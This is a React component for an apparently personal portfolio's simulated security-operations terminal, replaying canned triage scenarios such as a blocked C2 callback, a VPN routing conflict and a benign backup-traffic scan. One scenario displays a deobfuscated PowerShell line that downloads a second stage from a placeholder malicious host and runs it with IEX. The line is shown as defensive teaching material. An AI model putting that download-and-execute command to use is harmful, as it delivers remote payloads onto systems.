import { useEffect, useRef, useState, type FormEvent, type KeyboardEvent } from 'react';
import { ArrowRight, Check, Copy, Terminal } from 'lucide-react';
import type { AppRoute } from '@/types/project';

type ScenarioKey = 'c2' | 'unsloth' | 'vpn' | 'portscan';

interface TerminalLine {
  id: number;
  kind: 'cmd' | 'info' | 'alert' | 'drop' | 'success' | 'accent' | 'code' | 'link' | 'spacer';
  text?: string;
  route?: AppRoute;
  caseId?: string;
}

interface PracticeTerminalProps {
  onOpenCase: (caseId: string) => void;
  onNavigate: (route: AppRoute) => void;
}

const INITIAL_LINES: TerminalLine[] = [
  { id: 1, kind: 'info', text: 'Sample Investigation Viewer - Sheikh Soban Fayaz' },
  {
    id: 2,
    kind: 'info',
    text: "Select any preset above, or type 'help' below to walk through a triage scenario step by step.",
  },
  { id: 3, kind: 'spacer' },
  { id: 4, kind: 'cmd', text: 'check-status' },
  {
    id: 5,
    kind: 'success',
    text: 'Ready. Choose a scenario above to inspect the telemetry trail.',
  },
];

const SCENARIOS: Record<ScenarioKey, Omit<TerminalLine, 'id'>[]> = {
  c2: [
    { kind: 'spacer' },
    { kind: 'cmd', text: 'kql-query --incident #53358 --dataset CommonSecurityLog' },
    {
      kind: 'alert',
      text: '[!] Incident #53358 Trigger: Possible C2 Callback | Source: 10.16.56.241 | Target: external-doc-service.com',
    },
    { kind: 'info', text: '[-] Correlating Host Socket (msedge.exe) with Firewall DeviceAction...' },
    {
      kind: 'drop',
      text: "[DROP] Perimeter Firewall rule 'Block_Untrusted_Egress' dropped TCP handshake at 14:02:18 GST",
    },
    {
      kind: 'success',
      text: '[VERDICT: MITIGATED] Zero external egress. Host verified clean. Blast radius: 1 asset.',
    },
    {
      kind: 'link',
      text: 'Open Detailed Sentinel C2 Case Study',
      caseId: 'sentinel-c2-indicator',
    },
  ],
  unsloth: [
    { kind: 'spacer' },
    { kind: 'cmd', text: 'unsloth-infer --model llama-3-8b-secops --input sample_obf.ps1' },
    {
      kind: 'info',
      text: '[-] Loading local 4-bit LoRA adapter weights via Triton kernels (VRAM: 6.8 GB)...',
    },
    { kind: 'accent', text: '[DEOBFUSCATION COMPLETE in 0.42s]:' },
    {
      kind: 'code',
      text: "$payload = [System.Net.WebClient]::DownloadString('hxxps://malicious-cdn.net/stage2.bin'); IEX $payload",
    },
    {
      kind: 'alert',
      text: '[MITRE ATT&CK]: T1059.001 (Command & Scripting Interpreter) | T1027 (Obfuscated Files)',
    },
    {
      kind: 'success',
      text: '[STATUS]: Offline airgap preserved. Zero client PII transmitted to cloud.',
    },
    {
      kind: 'link',
      text: 'Open Full Unsloth LoRA Fine-Tuning Case Study',
      caseId: 'unsloth-lora-secops',
    },
  ],
  vpn: [
    { kind: 'spacer' },
    { kind: 'cmd', text: 'pcap-trace --client 192.168.1.105 --firewall-wan 198.51.100.1' },
    { kind: 'info', text: '[-] Client Adapter: Wireshark captures Client Hello on port 4433...' },
    { kind: 'drop', text: '[DIAGNOSTIC]: Packet absent on Firewall WAN interface X1.' },
    {
      kind: 'alert',
      text: '[ROOT CAUSE]: Local route table conflict: Secondary active VPN injected 0.0.0.0/0 route with metric 10.',
    },
    {
      kind: 'success',
      text: '[RESOLUTION]: Applied split-tunnel route exclusion. SSL VPN tunnel established in 1.2s.',
    },
    {
      kind: 'link',
      text: 'Open Multi-VPN Route Interception Case Study',
      caseId: 'multi-vpn-routing-conflict',
    },
  ],
  portscan: [
    { kind: 'spacer' },
    { kind: 'cmd', text: 'net-flow-analyze --src 10.12.8.254 --dst 10.12.7.114' },
    {
      kind: 'alert',
      text: '[!] High Connection Volume Flagged: 107,432 connection attempts observed.',
    },
    {
      kind: 'info',
      text: '[-] Enumerating target port scope: Port 445 (SMB) = 99.8% of traffic.',
    },
    {
      kind: 'info',
      text: '[-] Cross-referencing CMDB asset registry: Host 10.12.8.254 = Central Veeam Backup Node.',
    },
    {
      kind: 'success',
      text: '[VERDICT: BENIGN REPETITION] Legitimate scheduled backup stream. Scoped exclusion proposed.',
    },
    {
      kind: 'link',
      text: 'Open Internal Port-Scan Case Study',
      caseId: 'internal-portscan-analysis',
    },
  ],
};

const PRESET_BUTTONS: { key: ScenarioKey; label: string }[] = [
  { key: 'c2', label: '1. Blocked Web Alert' },
  { key: 'unsloth', label: '2. Decode Hidden Script' },
  { key: 'vpn', label: '3. Broken VPN Connection' },
  { key: 'portscan', label: '4. Heavy Internal Traffic' },
];

export function PracticeTerminal({ onOpenCase, onNavigate }: PracticeTerminalProps) {
  const [lines, setLines] = useState<TerminalLine[]>(INITIAL_LINES);
  const [commandInput, setCommandInput] = useState('');
  const [cmdHistory, setCmdHistory] = useState<string[]>([]);
  const [historyCursor, setHistoryCursor] = useState<number>(-1);
  const [copiedLog, setCopiedLog] = useState(false);
  const bodyRef = useRef<HTMLDivElement>(null);
  const nextIdRef = useRef(100);

  useEffect(() => {
    const el = bodyRef.current;
    if (el) {
      el.scrollTop = el.scrollHeight;
    }
  }, [lines]);

  const appendLines = (newLines: Omit<TerminalLine, 'id'>[]) => {
    setLines((prev) => [
      ...prev,
      ...newLines.map((line) => ({ ...line, id: nextIdRef.current++ })),
    ]);
  };

  const clearTerminal = () => {
    setLines([
      {
        id: nextIdRef.current++,
        kind: 'info',
        text: "Console cleared. Type 'help' or choose a preset.",
      },
    ]);
  };

  const runScenario = (key: ScenarioKey) => {
    appendLines(SCENARIOS[key]);
  };

  const handleCopyOutput = async () => {
    const transcript = lines
      .map((line) => {
        if (line.kind === 'spacer') return '';
        if (line.kind === 'cmd') return `soban@desk:~$ ${line.text ?? ''}`;
        return line.text ?? '';
      })
      .join('\n')
      .trim();
    try {
      await navigator.clipboard.writeText(transcript);
      setCopiedLog(true);
      window.setTimeout(() => setCopiedLog(false), 1800);
    } catch {
      // ignore clipboard errors
    }
  };

  const handleInputKeyDown = (e: KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'ArrowUp') {
      if (cmdHistory.length === 0) return;
      e.preventDefault();
      const nextCursor = historyCursor === -1 ? cmdHistory.length - 1 : Math.max(0, historyCursor - 1);
      setHistoryCursor(nextCursor);
      setCommandInput(cmdHistory[nextCursor] ?? '');
    } else if (e.key === 'ArrowDown') {
      if (historyCursor === -1) return;
      e.preventDefault();
      const nextCursor = historyCursor + 1;
      if (nextCursor >= cmdHistory.length) {
        setHistoryCursor(-1);
        setCommandInput('');
      } else {
        setHistoryCursor(nextCursor);
        setCommandInput(cmdHistory[nextCursor] ?? '');
      }
    }
  };

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    const val = commandInput.trim().toLowerCase();
    setCommandInput('');
    setHistoryCursor(-1);
    if (!val) return;
    setCmdHistory((prev) => [...prev, val]);

    if (val === 'clear') {
      clearTerminal();
      return;
    }

    if (val === 'c2' || val === 'unsloth' || val === 'vpn' || val === 'portscan') {
      runScenario(val);
      return;
    }

    if (val === 'help') {
      appendLines([
        { kind: 'cmd', text: 'help' },
        { kind: 'info', text: 'Available commands:' },
        { kind: 'info', text: '  c2        - Simulate Sentinel custom indicator triage' },
        { kind: 'info', text: '  unsloth   - Run local Llama-3 script deobfuscation' },
        { kind: 'info', text: '  vpn       - Trace multi-VPN routing collision' },
        { kind: 'info', text: '  portscan  - Investigate high-volume internal connection sweep' },
        { kind: 'info', text: '  cases     - View list of case studies' },
        { kind: 'info', text: '  clear     - Clear terminal screen' },
      ]);
      return;
    }

    if (val === 'cases') {
      appendLines([
        { kind: 'cmd', text: 'cases' },
        { kind: 'accent', text: 'Investigation Case Studies Available:' },
        { kind: 'info', text: '1. Unsloth AI Fine-Tuning | 2. Sentinel C2 Triage | 3. Internal Port-Scan' },
        {
          kind: 'info',
          text: '4. Netskope DLP Justification | 5. WAF Reconnaissance | 6. IP Reputation Correlation',
        },
        {
          kind: 'info',
          text: '7. Multi-VPN Routing Collision | 8. Site-to-Site IPsec Proposal Error | 9. Firewall Persistence',
        },
        {
          kind: 'info',
          text: '10. Firewall Service Reachability | 11. Layer 2 Bridge Anti-Spoof | 12. Physical Interface Diagnostics',
        },
        {
          kind: 'info',
          text: '13. Cloud Sandbox ATP & EDR | 14. SSL VPN Impossible Travel | 15. MSSP Queue Tuning',
        },
        { kind: 'info', text: '16. Anonymized Log Triage | 17. Windows 4688 Sysmon C2 Beaconing' },
        {
          kind: 'link',
          text: 'Browse All in Dedicated Investigations Hub',
          route: 'investigations',
        },
      ]);
      return;
    }

    appendLines([
      { kind: 'cmd', text: val },
      {
        kind: 'drop',
        text: "Command not recognized. Type 'help' for available commands or click a preset above.",
      },
    ]);
  };

  return (
    <section id="terminal" className="border-b border-[var(--hair)] py-16">
      <div className="mb-6 flex flex-wrap items-end justify-between gap-4">
        <div>
          <div className="font-mono-code mb-2 inline-flex items-center gap-2 text-[12px] font-medium text-[var(--accent-text)]">
            <Terminal className="h-4 w-4" strokeWidth={1.5} aria-hidden="true" />
            <span>Interactive practice console</span>
          </div>
          <h2 className="font-display m-0 text-[clamp(24px,3vw,32px)] font-semibold leading-[1.15] tracking-[-0.02em] text-[var(--ink)]">
            Live Investigation Terminal
          </h2>
        </div>
        <p className="m-0 max-w-[46ch] text-[14px] text-[var(--mute)]">
          Walk through real SOC triage logic step by step or type <code className="font-mono-code text-[var(--accent-text)]">help</code> below
        </p>
      </div>

      <div
        className="overflow-hidden rounded-2xl border border-slate-800 bg-[#0B1120] text-slate-200"
        style={{ boxShadow: 'var(--card-shadow)' }}
      >
        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-slate-800 bg-[#111827] px-4 py-3">
          <div className="flex items-center gap-2">
            <span className="h-2.5 w-2.5 rounded-full bg-slate-600" aria-hidden="true" />
            <span className="h-2.5 w-2.5 rounded-full bg-slate-600" aria-hidden="true" />
            <span className="h-2.5 w-2.5 rounded-full bg-slate-600" aria-hidden="true" />
            <span className="font-mono-code ml-2 text-[12px] text-slate-400">
              soban-practice-console
            </span>
          </div>
          <div className="flex items-center gap-3">
            <button
              type="button"
              onClick={handleCopyOutput}
              className="font-mono-code inline-flex items-center gap-1.5 rounded-md border border-slate-700 bg-slate-800/80 px-2.5 py-1 text-[11.5px] text-slate-300 transition-colors duration-150 hover:border-slate-500 hover:text-white cursor-pointer"
            >
              {copiedLog ? (
                <>
                  <Check className="h-3.5 w-3.5 text-emerald-400" strokeWidth={1.5} aria-hidden="true" />
                  <span>Copied</span>
                </>
              ) : (
                <>
                  <Copy className="h-3.5 w-3.5" strokeWidth={1.5} aria-hidden="true" />
                  <span>Copy output</span>
                </>
              )}
            </button>
            <span className="font-mono-code inline-flex items-center gap-2 text-[12px] font-medium text-emerald-400">
              <span className="h-1.5 w-1.5 rounded-full bg-emerald-400" aria-hidden="true" />
              Ready
            </span>
          </div>
        </div>

        <div className="flex flex-wrap items-center gap-2 border-b border-slate-800/80 bg-[#0F172A] px-4 py-2.5">
          <span className="font-mono-code mr-1 text-[12px] text-slate-400">
            Presets:
          </span>
          {PRESET_BUTTONS.map((preset) => (
            <button
              key={preset.key}
              type="button"
              onClick={() => runScenario(preset.key)}
              className="font-mono-code rounded-md border border-slate-700 bg-slate-800/80 px-2.5 py-1 text-[12px] text-slate-200 transition-colors duration-150 hover:border-blue-400 hover:bg-blue-500/15 hover:text-blue-300 cursor-pointer"
            >
              {preset.label}
            </button>
          ))}
          <button
            type="button"
            onClick={clearTerminal}
            className="font-mono-code rounded-md border border-slate-700 bg-slate-900 px-2.5 py-1 text-[12px] text-slate-400 transition-colors duration-150 hover:border-slate-500 hover:text-slate-200 cursor-pointer"
          >
            Clear
          </button>
        </div>

        <div
          ref={bodyRef}
          className="font-mono-code h-72 overflow-y-auto px-4 py-4 text-[12.5px] leading-6 sm:px-5 sm:text-[13px]"
        >
          {lines.map((line) => {
            if (line.kind === 'spacer') {
              return <div key={line.id} className="h-2" />;
            }
            if (line.kind === 'cmd') {
              return (
                <div key={line.id} className="text-emerald-400">
                  soban@desk:~$ <span className="text-white">{line.text}</span>
                </div>
              );
            }
            if (line.kind === 'alert') {
              return (
                <div key={line.id} className="text-amber-300">
                  {line.text}
                </div>
              );
            }
            if (line.kind === 'drop') {
              return (
                <div key={line.id} className="text-rose-400">
                  {line.text}
                </div>
              );
            }
            if (line.kind === 'success') {
              return (
                <div key={line.id} className="text-emerald-300">
                  {line.text}
                </div>
              );
            }
            if (line.kind === 'accent') {
              return (
                <div key={line.id} className="text-sky-300">
                  {line.text}
                </div>
              );
            }
            if (line.kind === 'code') {
              return (
                <div key={line.id} className="my-1 rounded-md border border-slate-800 bg-slate-950/80 px-3 py-1.5 text-[12px] text-slate-300">
                  {line.text}
                </div>
              );
            }
            if (line.kind === 'link') {
              return (
                <div key={line.id} className="pt-1">
                  <button
                    type="button"
                    onClick={() => {
                      if (line.caseId) onOpenCase(line.caseId);
                      else if (line.route) onNavigate(line.route);
                    }}
                    className="font-mono-code inline-flex items-center gap-1.5 text-left text-[12.5px] text-blue-400 underline underline-offset-4 transition-colors duration-150 hover:text-blue-300 cursor-pointer"
                  >
                    <ArrowRight className="h-3.5 w-3.5 shrink-0" strokeWidth={1.5} aria-hidden="true" />
                    <span>{line.text}</span>
                  </button>
                </div>
              );
            }
            return (
              <div key={line.id} className="text-slate-300">
                {line.text}
              </div>
            );
          })}
        </div>

        <form
          onSubmit={handleSubmit}
          className="flex items-center gap-2 border-t border-slate-800 bg-[#0F172A] px-4 py-3 sm:px-5"
        >
          <span className="font-mono-code shrink-0 text-[12.5px] font-semibold text-emerald-400">
            soban@desk:~$
          </span>
          <input
            type="text"
            value={commandInput}
            onChange={(e) => setCommandInput(e.target.value)}
            onKeyDown={handleInputKeyDown}
            placeholder="Type c2, unsloth, vpn, portscan, cases, or help (Up/Down for history)"
            aria-label="Practice terminal command input"
            autoComplete="off"
            spellCheck={false}
            className="font-mono-code w-full bg-transparent text-[13px] text-white placeholder:text-slate-500 focus:outline-none"
          />
        </form>
      </div>
    </section>
  );
}
